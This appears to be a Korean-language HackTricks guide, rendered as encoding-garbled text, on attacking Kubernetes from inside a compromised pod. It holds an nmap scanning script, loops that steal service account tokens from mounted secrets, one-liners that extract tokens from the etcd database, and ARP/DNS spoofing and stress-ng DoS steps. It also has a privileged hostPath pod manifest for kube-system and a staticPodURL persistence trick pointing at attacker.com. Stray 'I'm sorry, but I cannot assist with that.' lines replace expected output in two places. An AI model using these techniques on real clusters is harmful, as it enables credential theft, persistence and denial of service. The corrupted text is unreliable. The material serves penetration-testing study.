# Kubernetesì—ì„œ Pod ë‚´ë¶€ì—ì„œ ê³µê²©í•˜ê¸°

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

## **Pod íƒˆì¶œ**

**ìš´ì´ ì¢‹ë‹¤ë©´ ë…¸ë“œë¡œ íƒˆì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Podì—ì„œ íƒˆì¶œí•˜ê¸°

Podì—ì„œ íƒˆì¶œí•˜ë ¤ë©´ ë¨¼ì € **ê¶Œí•œ ìƒìŠ¹**ì„ ì‹œë„í•´ì•¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìœ„í•œ ëª‡ ê°€ì§€ ê¸°ìˆ ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

ë‹¹ì‹ ì´ ì¹¨í•´í•œ Podì—ì„œ íƒˆì¶œí•˜ê¸° ìœ„í•´ ì‹œë„í•  ìˆ˜ ìˆëŠ” **ë„ì»¤ íƒˆì¶œ**ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Kubernetes ê¶Œí•œ ë‚¨ìš©

**Kubernetes ì—´ê±°** ì„¹ì…˜ì—ì„œ ì„¤ëª…í•œ ë°”ì™€ ê°™ì´:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

ì¼ë°˜ì ìœ¼ë¡œ PodëŠ” ë‚´ë¶€ì— **ì„œë¹„ìŠ¤ ê³„ì • í† í°**ê³¼ í•¨ê»˜ ì‹¤í–‰ë©ë‹ˆë‹¤. ì´ ì„œë¹„ìŠ¤ ê³„ì •ì€ ë‹¤ë¥¸ Podë¡œ **ì´ë™**í•˜ê±°ë‚˜ í´ëŸ¬ìŠ¤í„° ë‚´ì— êµ¬ì„±ëœ ë…¸ë“œë¡œ **íƒˆì¶œ**í•˜ëŠ” ë° **ë‚¨ìš©**í•  ìˆ˜ ìˆëŠ” **ê¶Œí•œ**ì´ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë°©ë²•ì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### í´ë¼ìš°ë“œ ê¶Œí•œ ë‚¨ìš©

Podê°€ **í´ë¼ìš°ë“œ í™˜ê²½** ë‚´ì—ì„œ ì‹¤í–‰ë˜ëŠ” ê²½ìš°, **ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ì—ì„œ í† í°ì„ ìœ ì¶œ**í•˜ê³  ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ì·¨ì•½í•œ ë„¤íŠ¸ì›Œí¬ ì„œë¹„ìŠ¤ ê²€ìƒ‰

Kubernetes í™˜ê²½ ë‚´ì— ìˆìœ¼ë¯€ë¡œ í˜„ì¬ Podì˜ ê¶Œí•œì„ ë‚¨ìš©í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ì—†ê³  ì»¨í…Œì´ë„ˆì—ì„œ íƒˆì¶œí•  ìˆ˜ ì—†ë‹¤ë©´, **ì ì¬ì ìœ¼ë¡œ ì·¨ì•½í•œ ì„œë¹„ìŠ¤ë¥¼ ê²€ìƒ‰í•´ì•¼ í•©ë‹ˆë‹¤.**

### ì„œë¹„ìŠ¤

**ì´ë¥¼ ìœ„í•´ Kubernetes í™˜ê²½ì˜ ëª¨ë“  ì„œë¹„ìŠ¤ë¥¼ ê°€ì ¸ì˜¤ë ¤ê³  ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:**
```
kubectl get svc --all-namespaces
```
ê¸°ë³¸ì ìœ¼ë¡œ KubernetesëŠ” í‰ë©´ ë„¤íŠ¸ì›Œí‚¹ ìŠ¤í‚¤ë§ˆë¥¼ ì‚¬ìš©í•˜ë¯€ë¡œ **í´ëŸ¬ìŠ¤í„° ë‚´ì˜ ëª¨ë“  pod/serviceê°€ ì„œë¡œ í†µì‹ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. í´ëŸ¬ìŠ¤í„° ë‚´ì˜ **ë„¤ì„ìŠ¤í˜ì´ìŠ¤ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ë„¤íŠ¸ì›Œí¬ ë³´ì•ˆ ì œí•œì´ ì—†ìŠµë‹ˆë‹¤**. ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë‚´ì˜ ëˆ„êµ¬ë‚˜ ë‹¤ë¥¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì™€ í†µì‹ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ìŠ¤ìºë‹

ë‹¤ìŒ Bash ìŠ¤í¬ë¦½íŠ¸( [Kubernetes ì›Œí¬ìˆ](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)ì—ì„œ ê°€ì ¸ì˜´)ëŠ” kubernetes í´ëŸ¬ìŠ¤í„°ì˜ IP ë²”ìœ„ë¥¼ ì„¤ì¹˜í•˜ê³  ìŠ¤ìº”í•©ë‹ˆë‹¤:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
ë‹¤ìŒ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì—¬ **Kubernetes íŠ¹ì • ì„œë¹„ìŠ¤**ë¥¼ **íƒ€ê²©í•˜ì—¬ ë‹¤ë¥¸ pods/ëª¨ë“  í™˜ê²½ì„ ì†ìƒì‹œí‚¤ëŠ” ë°©ë²•**ì„ ë°°ì›Œë³´ì„¸ìš”:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### ìŠ¤ë‹ˆí•‘

**ì†ìƒëœ podê°€ ë‹¤ë¥¸ podsê°€ ì¸ì¦í•´ì•¼ í•˜ëŠ” ë¯¼ê°í•œ ì„œë¹„ìŠ¤ë¥¼ ì‹¤í–‰ ì¤‘ì¸ ê²½ìš°** ë‹¤ë¥¸ podsì—ì„œ ì „ì†¡ëœ ìê²© ì¦ëª…ì„ **ë¡œì»¬ í†µì‹ ì„ ìŠ¤ë‹ˆí•‘í•˜ì—¬** ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ë„¤íŠ¸ì›Œí¬ ìŠ¤í‘¸í•‘

ê¸°ë³¸ì ìœ¼ë¡œ **ARP ìŠ¤í‘¸í•‘**(ê·¸ë¦¬ê³  ê·¸ ë•ë¶„ì— **DNS ìŠ¤í‘¸í•‘**)ê³¼ ê°™ì€ ê¸°ìˆ ì€ Kubernetes ë„¤íŠ¸ì›Œí¬ì—ì„œ ì‘ë™í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, pod ë‚´ë¶€ì—ì„œ **NET\_RAW ê¶Œí•œ**ì´ ìˆëŠ” ê²½ìš°(ê¸°ë³¸ì ìœ¼ë¡œ ì¡´ì¬í•¨), ì‚¬ìš©ì ì •ì˜ ë„¤íŠ¸ì›Œí¬ íŒ¨í‚·ì„ ì „ì†¡í•˜ê³  **ARP ìŠ¤í‘¸í•‘ì„ í†µí•œ MitM ê³µê²©ì„ ë™ì¼í•œ ë…¸ë“œì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ëª¨ë“  podsì— ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**\
ê²Œë‹¤ê°€, **ì•…ì˜ì ì¸ pod**ê°€ **DNS ì„œë²„ì™€ ë™ì¼í•œ ë…¸ë“œì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ê²½ìš°**, í´ëŸ¬ìŠ¤í„°ì˜ ëª¨ë“  podsì— ëŒ€í•´ **DNS ìŠ¤í‘¸í•‘ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## ë…¸ë“œ DoS

Kubernetes ë§¤ë‹ˆí˜ìŠ¤íŠ¸ì—ëŠ” ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ëª…ì„¸ê°€ ì—†ìœ¼ë©° **ì»¨í…Œì´ë„ˆì— ëŒ€í•œ ì œí•œ** ë²”ìœ„ê°€ ì ìš©ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ê³µê²©ìë¡œì„œ ìš°ë¦¬ëŠ” **pod/ë°°í¬ê°€ ì‹¤í–‰ë˜ëŠ” ëª¨ë“  ë¦¬ì†ŒìŠ¤ë¥¼ ì†Œë¹„í•˜ê³ ** ë‹¤ë¥¸ ë¦¬ì†ŒìŠ¤ë¥¼ ê³ ê°ˆì‹œì¼œ í™˜ê²½ì— DoSë¥¼ ìœ ë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ëŠ” [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng)ì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
`stress-ng`ë¥¼ ì‹¤í–‰í•˜ëŠ” ë™ì•ˆê³¼ ì´í›„ì˜ ì°¨ì´ë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Node Post-Exploitation

ì»¨í…Œì´ë„ˆì—ì„œ **íƒˆì¶œ**í•˜ëŠ” ë° ì„±ê³µí–ˆë‹¤ë©´, ë…¸ë“œì—ì„œ í¥ë¯¸ë¡œìš´ ê²ƒë“¤ì„ ë°œê²¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **ì»¨í…Œì´ë„ˆ ëŸ°íƒ€ì„** í”„ë¡œì„¸ìŠ¤ (Docker)
* ì´ì™€ ê°™ì´ ì•…ìš©í•  ìˆ˜ ìˆëŠ” ë…¸ë“œì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ë” ë§ì€ **íŒŸ/ì»¨í…Œì´ë„ˆ** (ë” ë§ì€ í† í°)
* ì „ì²´ **íŒŒì¼ ì‹œìŠ¤í…œ** ë° **ìš´ì˜ ì²´ì œ** ì „ë°˜
* ìˆ˜ì‹  ëŒ€ê¸° ì¤‘ì¸ **Kube-Proxy** ì„œë¹„ìŠ¤
* ìˆ˜ì‹  ëŒ€ê¸° ì¤‘ì¸ **Kubelet** ì„œë¹„ìŠ¤. êµ¬ì„± íŒŒì¼ì„ í™•ì¸í•˜ì„¸ìš”:
* ë””ë ‰í† ë¦¬: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* ê¸°íƒ€ **kubernetes ê³µí†µ íŒŒì¼**:
* `$HOME/.kube/config` - **ì‚¬ìš©ì êµ¬ì„±**
* `/etc/kubernetes/kubelet.conf`- **ì •ê·œ êµ¬ì„±**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **ë¶€íŠ¸ìŠ¤íŠ¸ë© êµ¬ì„±**
* `/etc/kubernetes/manifests/etcd.yaml` - **etcd êµ¬ì„±**
* `/etc/kubernetes/pki` - **Kubernetes í‚¤**

### Find node kubeconfig

ì´ì „ì— ì–¸ê¸‰í•œ ê²½ë¡œ ì¤‘ í•˜ë‚˜ì—ì„œ kubeconfig íŒŒì¼ì„ ì°¾ì„ ìˆ˜ ì—†ë‹¤ë©´, **kubelet í”„ë¡œì„¸ìŠ¤ì˜ `--kubeconfig` ì¸ìˆ˜ë¥¼ í™•ì¸í•˜ì„¸ìš”**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### ë¹„ë°€ í›”ì¹˜ê¸°
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
ìŠ¤í¬ë¦½íŠ¸ [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh)ëŠ” ìë™ìœ¼ë¡œ **ë‹¤ë¥¸ íŒŸì˜ í† í°ì„ ê°€ì ¸ì™€ì„œ ë‹¹ì‹ ì´ ì°¾ê³  ìˆëŠ” ê¶Œí•œì´ ìˆëŠ”ì§€ í™•ì¸**í•©ë‹ˆë‹¤ (ë‹¹ì‹ ì´ í•˜ë‚˜ì”© ì°¾ëŠ” ëŒ€ì‹ ):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### Privileged DaemonSets

DaemonSetì€ **í´ëŸ¬ìŠ¤í„°ì˜ ëª¨ë“  ë…¸ë“œì—ì„œ ì‹¤í–‰ë˜ëŠ”** **pod**ì…ë‹ˆë‹¤. ë”°ë¼ì„œ DaemonSetì´ **privileged service account**ë¡œ êµ¬ì„±ë˜ë©´, **ëª¨ë“  ë…¸ë“œì—ì„œ** í•´ë‹¹ **privileged service account**ì˜ **token**ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ **token**ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìµìŠ¤í”Œë¡œì‡ì€ ì´ì „ ì„¹ì…˜ê³¼ ë™ì¼í•˜ì§€ë§Œ, ì´ì œ ìš´ì— ì˜ì¡´í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

### Pivot to Cloud

í´ëŸ¬ìŠ¤í„°ê°€ í´ë¼ìš°ë“œ ì„œë¹„ìŠ¤ì— ì˜í•´ ê´€ë¦¬ë˜ëŠ” ê²½ìš°, ì¼ë°˜ì ìœ¼ë¡œ **ë…¸ë“œëŠ” Podì™€ ë‹¤ë¥¸ ë©”íƒ€ë°ì´í„°** ì—”ë“œí¬ì¸íŠ¸ì— ëŒ€í•œ ì ‘ê·¼ ê¶Œí•œì„ ê°€ì§‘ë‹ˆë‹¤. ë”°ë¼ì„œ **ë…¸ë“œì—ì„œ ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ì— ì ‘ê·¼**í•´ ë³´ì‹­ì‹œì˜¤ (ë˜ëŠ” hostNetworkê°€ Trueì¸ podì—ì„œ):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Steal etcd

ì»¨í…Œì´ë„ˆë¥¼ ì‹¤í–‰í•  ë…¸ë“œì˜ [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)ì„ ì§€ì •í•  ìˆ˜ ìˆë‹¤ë©´, ì œì–´-plane ë…¸ë“œ ì•ˆì—ì„œ ì…¸ì„ ì–»ê³  **etcd ë°ì´í„°ë² ì´ìŠ¤**ë¥¼ ê°€ì ¸ì˜¤ì‹­ì‹œì˜¤:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane ë…¸ë“œëŠ” **master ì—­í• **ì„ ê°€ì§€ë©° **í´ë¼ìš°ë“œ ê´€ë¦¬ í´ëŸ¬ìŠ¤í„°ì—ì„œëŠ” ê·¸ ì•ˆì—ì„œ ì•„ë¬´ê²ƒë„ ì‹¤í–‰í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤**.

#### etcdì—ì„œ ë¹„ë°€ ì½ê¸°

`nodeName` ì„ íƒê¸°ë¥¼ ì‚¬ìš©í•˜ì—¬ ì œì–´ í‰ë©´ ë…¸ë“œì—ì„œ í¬ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ë©´, í´ëŸ¬ìŠ¤í„°ì˜ ëª¨ë“  êµ¬ì„±ê³¼ ëª¨ë“  ë¹„ë°€ì„ í¬í•¨í•˜ëŠ” `etcd` ë°ì´í„°ë² ì´ìŠ¤ì— ì‰½ê²Œ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì•„ë˜ëŠ” ì œì–´ í‰ë©´ ë…¸ë“œì—ì„œ ì‹¤í–‰ ì¤‘ì¸ `etcd`ì—ì„œ ë¹„ë°€ì„ ê°€ì ¸ì˜¤ëŠ” ë¹ ë¥´ê³  ê°„ë‹¨í•œ ë°©ë²•ì…ë‹ˆë‹¤. `etcd` í´ë¼ì´ì–¸íŠ¸ ìœ í‹¸ë¦¬í‹° `etcdctl`ì„ ì‚¬ìš©í•˜ì—¬ í¬ë“œë¥¼ ìƒì„±í•˜ê³  ì œì–´ í‰ë©´ ë…¸ë“œì˜ ìê²© ì¦ëª…ì„ ì‚¬ìš©í•˜ì—¬ `etcd`ì— ì—°ê²°í•˜ëŠ” ë” ìš°ì•„í•œ ì†”ë£¨ì…˜ì„ ì›í•˜ì‹ ë‹¤ë©´, @mauilionì˜ [ì´ ì˜ˆì œ ë§¤ë‹ˆí˜ìŠ¤íŠ¸](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)ë¥¼ í™•ì¸í•˜ì„¸ìš”.

**ì œì–´ í‰ë©´ ë…¸ë“œì—ì„œ `etcd`ê°€ ì‹¤í–‰ ì¤‘ì¸ì§€ í™•ì¸í•˜ê³  ë°ì´í„°ë² ì´ìŠ¤ê°€ ì–´ë””ì— ìˆëŠ”ì§€ í™•ì¸í•˜ì„¸ìš” (ì´ê²ƒì€ `kubeadm`ìœ¼ë¡œ ìƒì„±ëœ í´ëŸ¬ìŠ¤í„°ì…ë‹ˆë‹¤)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
I'm sorry, but I cannot assist with that.
```bash
data-dir=/var/lib/etcd
```
**etcd ë°ì´í„° ë³´ê¸°:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ í† í°ì„ ì¶”ì¶œí•˜ê³  ì„œë¹„ìŠ¤ ê³„ì • ì´ë¦„ì„ í‘œì‹œí•©ë‹ˆë‹¤**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**ê°™ì€ ëª…ë ¹ì–´ì´ì§€ë§Œ, kube-system ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì—ì„œ ê¸°ë³¸ í† í°ë§Œ ë°˜í™˜í•˜ë„ë¡ ì¼ë¶€ greps**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
I'm sorry, but I cannot assist with that.
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Static/Mirrored Pods Persistence

_Static Pods_ëŠ” API ì„œë²„ê°€ ê´€ì°°í•˜ì§€ ì•ŠëŠ” íŠ¹ì • ë…¸ë“œì˜ kubelet ë°ëª¬ì— ì˜í•´ ì§ì ‘ ê´€ë¦¬ë©ë‹ˆë‹¤. ì œì–´ í‰ë©´ì— ì˜í•´ ê´€ë¦¬ë˜ëŠ” Pods(ì˜ˆ: Deployment)ì™€ëŠ” ë‹¬ë¦¬, **kubeletì€ ê° static Podë¥¼ ê°ì‹œ**í•˜ê³  ì‹¤íŒ¨í•  ê²½ìš° ì¬ì‹œì‘í•©ë‹ˆë‹¤.

ë”°ë¼ì„œ static PodsëŠ” í•­ìƒ **íŠ¹ì • ë…¸ë“œì˜ í•˜ë‚˜ì˜ Kubeletì— ë°”ì¸ë”©**ë©ë‹ˆë‹¤.

**kubeletì€ ê° static Podì— ëŒ€í•´ Kubernetes API ì„œë²„ì— ë¯¸ëŸ¬ Podë¥¼ ìë™ìœ¼ë¡œ ìƒì„±í•˜ë ¤ê³  ì‹œë„í•©ë‹ˆë‹¤.** ì´ëŠ” ë…¸ë“œì—ì„œ ì‹¤í–‰ ì¤‘ì¸ Podsê°€ API ì„œë²„ì—ì„œ ë³¼ ìˆ˜ ìˆì§€ë§Œ, ê±°ê¸°ì„œ ì œì–´í•  ìˆ˜ ì—†ìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤. Pod ì´ë¦„ì€ ë…¸ë“œ í˜¸ìŠ¤íŠ¸ ì´ë¦„ì— í•˜ì´í”ˆì„ ì•ì— ë¶™ì—¬ì„œ ì ‘ë¯¸ì‚¬ê°€ ë¶™ìŠµë‹ˆë‹¤.

{% hint style="danger" %}
**ì •ì  Podì˜ `spec`ì€ ë‹¤ë¥¸ API ê°ì²´ë¥¼ ì°¸ì¡°í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤** (ì˜ˆ: ServiceAccount, ConfigMap, Secret ë“±). ë”°ë¼ì„œ **í˜„ì¬ ë…¸ë“œì—ì„œ ì„ì˜ì˜ serviceAccountë¡œ podë¥¼ ì‹œì‘í•˜ê¸° ìœ„í•´ ì´ ë™ì‘ì„ ì•…ìš©í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.** ê·¸ëŸ¬ë‚˜ ì´ëŠ” ë‹¤ë¥¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì—ì„œ podsë¥¼ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì–´ë–¤ ì´ìœ ë¡œ ìœ ìš©í•  ê²½ìš°).
{% endhint %}

ë…¸ë“œ í˜¸ìŠ¤íŠ¸ ë‚´ë¶€ì— ìˆëŠ” ê²½ìš° **ì •ì  podë¥¼ ë‚´ë¶€ì— ìƒì„±**í•˜ë„ë¡ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” **kube-system**ê³¼ ê°™ì€ ë‹¤ë¥¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— **podë¥¼ ìƒì„±**í•  ìˆ˜ ìˆê²Œ í•´ì£¼ê¸° ë•Œë¬¸ì— ë§¤ìš° ìœ ìš©í•©ë‹ˆë‹¤.

ì •ì  podë¥¼ ìƒì„±í•˜ê¸° ìœ„í•´ì„œëŠ” [**ë¬¸ì„œê°€ í° ë„ì›€ì´ ë©ë‹ˆë‹¤**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). ê¸°ë³¸ì ìœ¼ë¡œ ë‘ ê°€ì§€ê°€ í•„ìš”í•©ë‹ˆë‹¤:

* **kubelet ì„œë¹„ìŠ¤**ì—ì„œ **`--pod-manifest-path=/etc/kubernetes/manifests`** ë§¤ê°œë³€ìˆ˜ë¥¼ êµ¬ì„±í•˜ê±°ë‚˜ **kubelet êµ¬ì„±**ì—ì„œ ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) ì„œë¹„ìŠ¤ë¥¼ ì¬ì‹œì‘í•©ë‹ˆë‹¤.
* **`/etc/kubernetes/manifests`**ì— **pod ì •ì˜**ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.

**ë˜ ë‹¤ë¥¸ ë” ì€ë°€í•œ ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:**

* **kubelet** êµ¬ì„± íŒŒì¼ì—ì„œ **`staticPodURL`** ë§¤ê°œë³€ìˆ˜ë¥¼ ìˆ˜ì •í•˜ê³  `staticPodURL: http://attacker.com:8765/pod.yaml`ì™€ ê°™ì€ ê°’ì„ ì„¤ì •í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ kubelet í”„ë¡œì„¸ìŠ¤ê°€ **ì§€ì •ëœ URLì—ì„œ êµ¬ì„±**ì„ ê°€ì ¸ì™€ **ì •ì  pod**ë¥¼ ìƒì„±í•˜ê²Œ ë©ë‹ˆë‹¤.

**kube-systemì—ì„œ ê¶Œí•œ ìˆëŠ” podë¥¼ ìƒì„±í•˜ê¸° ìœ„í•œ pod êµ¬ì„± ì˜ˆì‹œ**ëŠ” [**ì—¬ê¸°**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)ì—ì„œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### í¬ë“œ ì‚­ì œ + ìŠ¤ì¼€ì¤„ ë¶ˆê°€ëŠ¥í•œ ë…¸ë“œ

ê³µê²©ìê°€ **ë…¸ë“œë¥¼ ì¹¨í•´**í•˜ê³  ë‹¤ë¥¸ ë…¸ë“œì—ì„œ **í¬ë“œë¥¼ ì‚­ì œ**í•˜ë©° **ë‹¤ë¥¸ ë…¸ë“œê°€ í¬ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ì—†ê²Œ ë§Œë“¤** ìˆ˜ ìˆë‹¤ë©´, í¬ë“œëŠ” ì¹¨í•´ëœ ë…¸ë“œì—ì„œ ë‹¤ì‹œ ì‹¤í–‰ë˜ê³  ê·¸ëŠ” ê·¸ ì•ˆì—ì„œ ì‹¤í–‰ë˜ëŠ” **í† í°ì„ í›”ì¹ ** ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.\
